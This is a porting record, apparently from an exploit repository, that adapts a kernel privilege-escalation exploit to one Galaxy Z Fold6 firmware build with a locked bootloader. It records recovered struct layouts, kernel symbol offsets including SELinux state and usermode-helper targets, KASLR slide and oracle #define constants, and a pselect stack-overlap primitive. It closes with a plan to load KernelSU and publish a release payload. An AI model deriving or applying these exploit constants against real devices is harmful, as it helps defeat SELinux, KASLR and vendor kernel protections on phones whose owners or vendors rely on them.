# SM-F956B / F956BXXS4DZG3 porting record

This record tracks the exact-firmware port for the Galaxy Z Fold6 `SM-F956B` build `F956BXXS4DZG3`. Values from sibling Snapdragon devices or other Fold6 builds must not be reused unless independently verified against this exact kernel and bootloader.

## Stage 1: target identity

Status: **COMPLETE for runtime identity and AP boot/kernel evidence**

| Field | Verified value |
| --- | --- |
| Model | `SM-F956B` |
| Device codename | `q6q` |
| Android | `16` |
| Android build ID | `BP4A.251205.006` |
| AP/build | `F956BXXS4DZG3` |
| Build fingerprint | `samsung/q6qxeea/q6q:16/BP4A.251205.006/F956BXXS4DZG3:user/release-keys` |
| Security patch | `2026-07-05` |
| SoC | `SM8650` |
| Kernel release | `6.1.145-android14-11-33418572-abF956BXXS4DZG3` |
| Verified boot state | `green` |
| vbmeta device state | `locked` |
| flash locked | `1` |

The supplied boot image contains the exact kernel release string above, so the analysis below is tied to DZG3 rather than a sibling Fold6 build.

## AP boot and raw kernel evidence

The supplied decompressed Android boot image is a 96 MiB boot image with an ARM64 Image payload beginning at page offset `0x1000`.

| Object | Size (bytes) | SHA-256 |
| --- | ---: | --- |
| supplied `boot.img` | 100,663,296 | `29c62249026a91b8f6c66747a9fdb816a9287737201c375399af074935b1f2ab` |
| raw ARM64 kernel | 38,005,248 | `63bc02e54747a0d85bba41effe619fa25ca763dc74af1fd09678fb6795983970` |
| extracted raw BTF | 5,981,643 | `8415104c012e18942b18bcb52f401075cb6b92df837b9552a8c11070d65efe56` |

ARM64 Image header:

```text
text_offset = 0x0000000000000000
image_size  = 0x00000000026f0000
flags       = 0x000000000000000a
magic       = ARMd
```

The kernel contains the exact module release string:

```text
6.1.145-android14-11-33418572-abF956BXXS4DZG3 SMP preempt mod_unload modversions aarch64
```

## BTF/layout result

The validated BTF blob is at raw Image interval `[0x180b384, 0x1dbf94f)`. Its SHA-256 is byte-identical to the independently recovered S928U/S928U1 DZF2 BTF already recorded in this repository. Therefore the required structure ABI below is not inferred from SoC similarity: it is backed by an identical target BTF byte stream.

```text
file_operations: size 0x110; ioctl 0x50; compat_ioctl 0x58; mmap 0x60;
  open 0x70; release 0x80; splice_read 0xc8; show_fdinfo 0xe0

task_struct: size 0x12c0; usage 0x40; prio 0x84; normal_prio 0x8c;
  sched_task_group 0x348; pi_lock 0x924; pi_waiters 0x938;
  pi_top_task 0x948; pi_blocked_on 0x950

rt_mutex_waiter: size 0x58; tree_entry 0x00; pi_tree_entry 0x18;
  task 0x30; lock 0x38; wake_state 0x40; prio 0x44;
  deadline 0x48; ww_ctx 0x50

configfs_buffer: page 0x10; needs_read_fill 0x50; bin_buffer 0x58;
  bin_buffer_size 0x60; cb_max_size 0x64

workqueue_struct.dfl_pwq 0xb0
pool_workqueue: pool 0x00; wq 0x08; work_color 0x10; refcnt 0x18;
  nr_active 0x5c; max_active 0x60
worker_pool: worklist 0x28; nr_idle 0x3c
work_struct: data 0x00; entry 0x08; func 0x18
page/slab: size 0x40; compound_head 0x08; slab_cache 0x18; page_type 0x30
```

The target uses the compact Android 6.1 `rt_mutex_waiter` layout and therefore requires `COMPACT_RT_MUTEX_WAITER=1`.

## Kallsyms and target offsets

The DZG3 raw Image exposes a valid compressed kallsyms table. The recovered image base is `0xffffffc008000000`; 107,254 symbols were decoded from the target Image. Required offsets are:

| Use | Target symbol/derivation | Offset |
| --- | --- | ---: |
| usermode-helper worker | `call_usermodehelper_exec_work` | `0x000d39cc` |
| no-op seek | `noop_llseek` | `0x003a14e4` |
| splice read | `generic_file_splice_read` | `0x003ef340` |
| configfs read | `configfs_read_iter` | `0x004712a4` |
| configfs binary write | `configfs_bin_write_iter` | `0x004717d4` |
| ashmem ioctl | `ashmem_ioctl` | `0x00d3a314` |
| ashmem compat ioctl | `compat_ashmem_ioctl` | `0x00d3ac4c` |
| ashmem mmap | `ashmem_mmap` | `0x00d3aca4` |
| ashmem open | `ashmem_open` | `0x00d3aed0` |
| ashmem release | `ashmem_release` | `0x00d3af58` |
| ashmem fdinfo | `ashmem_show_fdinfo` | `0x00d3b078` |
| anonymous pipe operations | `anon_pipe_buf_ops` | `0x01219d90` |
| ashmem operations | `ashmem_fops` | `0x013d1140` |
| allocator caches | `kmalloc_caches` | `0x0176c6f8` |
| unbound workqueue | `system_unbound_wq` | `0x0223ae60` |
| logger array | `loggers` | `0x02242968` |
| netfilter logger object | `nfulnl_logger` | `0x02242a20` |
| initial task | `init_task` | `0x0224f8c0` |
| ashmem misc fops | `ashmem_miscs + 0x10` | `0x023bb5b0` |
| root task group | `root_task_group` | `0x0244cd80` |
| SELinux state/enforcing | `selinux_state` / BTF member | `0x02521588` |
| boot-ID sysctl storage | `sysctl_bootid` | `0x026046e8` |

Most symbol offsets are identical to S928U DZF2, but target-specific literal/data checks were still performed rather than assumed.

## Slide/KASLR constants

The ftrace-event section begins at `0x021ff2b0`; `__event_sched_blocked_reason` is at `0x021ff560`. The difference is `0x2b0`, or 86 eight-byte registration entries. With the Android 6.1 dynamic event base of 20:

```c
#define SLIDE_TRACEFS_EVENT_ID 106
```

Target disassembly of `worker_thread` shows its blocking `bl schedule` at offset `0x000db19c`; the saved return/wchan address is therefore:

```c
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL
```

The target `__arm64_sys_pselect6` and `core_sys_select` stack geometry places the on-stack fd-set array at syscall-entry `E - 0x200`. With the compact waiter beginning at `E - 0x1e8`, waiter qword zero overlaps logical fd-set qword three:

```c
#define SLIDE_PSELECT_WORD_SHIFT 3
#define SKB_DATA_DELTA (-0x1000LL)
```

### Netfilter logger and boot-ID oracle

This is one place where DZG3 is not byte-for-byte identical to the checked-in E3Q target header. DZG3 contains exactly one `nfnetlink_log` string at Image offset `0x016a61e6`. The first qword of the target `nfulnl_logger` object at `0x02242a20` points to `0xffffffc0096a61e6`.

The target constants are therefore:

```c
#define SLIDE_NFULNL_LOGGER_OFF       0x016a61e6ULL
#define SLIDE_LOGGERS_0_1_OFF         0x02242a20ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x023762f0ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x026046e8ULL
```

The qword at Image offset `0x023762f0` points exactly to target `sysctl_bootid`, confirming the `random_table[].data` oracle slot independently.

## P0 fingerprint

All 32 P0 candidates (`0x000000` through `0x1f0000`, step `0x10000`) were generated from the exact DZG3 raw Image, with eight little-endian qwords per row at page offsets `0x000, 0x200, ..., 0xe00`.

The generated header is byte-identical to the S928U DZF2 fingerprint header:

```text
src/targets/q6q-F956BXXS4DZG3/p0_fingerprint.h
SHA-256 ed0540d293e9b39cb19470ff4d382a9b7195c6ea61bb3afc0d34072bb422f859
```

This identity is a result of source readback from the DZG3 raw Image, not an assumption based on the shared SoC.

## Remaining Qualcomm ABL gate

Status: **BLOCKED pending the matching DZG3 bootloader image**

The exploit still needs target-proven physical load constants:

```c
#define P0_PHYS_OFFSET      ...
#define P0_KERNEL_PHYS_LOAD ...
```

S928U DZF2 uses `0x80000000` / `0x80080000`, but these values are intentionally not copied into the F956B target until the matching Qualcomm `abl.elf` from `BL_F956BXXS4DZG3...` is analyzed. Other modern Snapdragon Samsung targets demonstrate that this value is not globally portable.

Required next input:

```text
abl.elf.lz4
```

from the exact DZG3 BL archive. `vendor_boot.img.lz4` is also useful for DTB/platform cross-checks but is secondary to ABL.

## KernelSU late-load plan

After the ABL gate is closed, build KernelSU v3.2.5 with the repository Samsung KDP/RKP/DEFEX patch and exact target vermagic:

```text
6.1.145-android14-11-33418572-abF956BXXS4DZG3 SMP preempt mod_unload modversions aarch64
```

Every undefined import must be audited against the target-derived kallsyms/vmlinux symbol set before hardware late-load testing. A sibling E3Q `.ko` must not be published as the F956B module merely because the BTF and most offsets match.

## Publication gate

Do not add `target.h`, a support-feed entry, release payload, or target KernelSU binary until the DZG3 ABL physical-load derivation is complete. Hardware execution remains a separate final validation step.